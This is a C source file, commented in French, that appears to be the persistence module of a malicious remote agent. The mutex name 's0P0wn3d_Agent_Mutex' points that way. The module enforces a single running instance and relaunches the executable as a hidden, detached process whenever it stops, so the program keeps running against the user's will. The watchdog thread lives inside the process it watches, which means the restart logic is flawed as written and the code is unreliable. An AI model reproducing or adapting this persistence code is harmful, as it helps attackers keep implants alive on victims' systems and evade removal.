#include "watchdog.h"
#include <stdio.h>
#include <tlhelp32.h>

#define WATCHDOG_CHECK_INTERVAL 5000  // 5 secondes
#define MUTEX_NAME "Global\\s0P0wn3d_Agent_Mutex"

// Variables globales pour le watchdog
static BOOL g_watchdog_running = FALSE;
static HANDLE g_watchdog_thread = NULL;
static HANDLE g_parent_process = NULL;

/**
 * Vérifie si un autre processus agent tourne déjà
 */
BOOL check_already_running() {
    HANDLE mutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    
    if (mutex == NULL) {
        return TRUE;  // Erreur, on suppose qu'il tourne déjà
    }
    
    DWORD error = GetLastError();
    
    if (error == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return TRUE;  // Déjà en cours d'exécution
    }
    
    // On garde le mutex ouvert pour signaler notre présence
    return FALSE;
}

/**
 * Crée le mutex de protection
 */
HANDLE create_singleton_mutex() {
    HANDLE mutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    
    if (mutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return NULL;  // Un autre processus existe déjà
    }
    
    return mutex;
}

/**
 * Lance une instance de l'agent
 */
BOOL spawn_agent_process(const char *exe_path) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    char cmd[MAX_PATH + 10];
    snprintf(cmd, sizeof(cmd), "\"%s\"", exe_path);
    
    if (!CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] Failed to spawn agent: %lu\n", GetLastError());
        return FALSE;
    }
    
    printf("[+] Agent spawned (PID: %lu)\n", pi.dwProcessId);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return TRUE;
}

/**
 * Thread du watchdog
 */
DWORD WINAPI watchdog_thread_func(LPVOID lpParam) {
    char exe_path[MAX_PATH];
    DWORD restart_count = 0;
    
    // Récupérer le chemin de l'exécutable
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    printf("[*] Watchdog started\n");
    printf("    Monitoring: %s\n", exe_path);
    printf("    Check interval: %d seconds\n", WATCHDOG_CHECK_INTERVAL / 1000);
    
    while (g_watchdog_running) {
        // Attendre l'intervalle de vérification
        Sleep(WATCHDOG_CHECK_INTERVAL);
        
        if (!g_watchdog_running) break;
        
        // Vérifier si le processus parent est toujours vivant
        if (g_parent_process != NULL) {
            DWORD exit_code;
            
            if (GetExitCodeProcess(g_parent_process, &exit_code)) {
                if (exit_code != STILL_ACTIVE) {
                    // Le processus parent est mort !
                    printf("[!] Parent process died (exit code: %lu)\n", exit_code);
                    printf("[*] Attempting to restart agent...\n");
                    
                    // Attendre un peu pour éviter le spam
                    Sleep(2000);
                    
                    // Redémarrer l'agent
                    if (spawn_agent_process(exe_path)) {
                        restart_count++;
                        printf("[+] Agent restarted (restart #%lu)\n", restart_count);
                    } else {
                        printf("[-] Failed to restart agent\n");
                    }
                    
                    // Si trop de redémarrages, ralentir
                    if (restart_count > 5) {
                        printf("[!] Too many restarts, slowing down...\n");
                        Sleep(60000);  // Attendre 1 minute
                        restart_count = 0;
                    }
                    
                    // Le watchdog termine après avoir relancé
                    // Le nouvel agent lancera son propre watchdog
                    break;
                }
            }
        } else {
            // Pas de processus parent défini, on surveille juste
            // Vérifier qu'au moins un agent tourne
            if (!check_already_running()) {
                // Aucun agent ne tourne, en redémarrer un
                printf("[!] No agent running, restarting...\n");
                spawn_agent_process(exe_path);
                Sleep(5000);
            }
        }
    }
    
    printf("[*] Watchdog stopped\n");
    return 0;
}

/**
 * Démarre le watchdog
 */
HANDLE start_watchdog() {
    if (g_watchdog_running) {
        printf("[!] Watchdog already running\n");
        return g_watchdog_thread;
    }
    
    g_watchdog_running = TRUE;
    
    // Créer un handle sur le processus actuel pour surveillance
    HANDLE current_process = GetCurrentProcess();
    DuplicateHandle(
        current_process,
        current_process,
        current_process,
        &g_parent_process,
        0,
        FALSE,
        DUPLICATE_SAME_ACCESS
    );
    
    // Lancer le thread du watchdog
    g_watchdog_thread = CreateThread(
        NULL,
        0,
        watchdog_thread_func,
        NULL,
        0,
        NULL
    );
    
    if (g_watchdog_thread == NULL) {
        printf("[-] Failed to start watchdog thread: %lu\n", GetLastError());
        g_watchdog_running = FALSE;
        
        if (g_parent_process) {
            CloseHandle(g_parent_process);
            g_parent_process = NULL;
        }
        
        return NULL;
    }
    
    printf("[+] Watchdog thread started\n");
    return g_watchdog_thread;
}

/**
 * Arrête le watchdog
 */
void stop_watchdog(HANDLE watchdog_handle) {
    if (!g_watchdog_running) {
        return;
    }
    
    printf("[*] Stopping watchdog...\n");
    
    g_watchdog_running = FALSE;
    
    if (watchdog_handle != NULL) {
        // Attendre que le thread se termine (max 10 secondes)
        WaitForSingleObject(watchdog_handle, 10000);
        CloseHandle(watchdog_handle);
    }
    
    if (g_parent_process != NULL) {
        CloseHandle(g_parent_process);
        g_parent_process = NULL;
    }
    
    g_watchdog_thread = NULL;
    
    printf("[+] Watchdog stopped\n");
}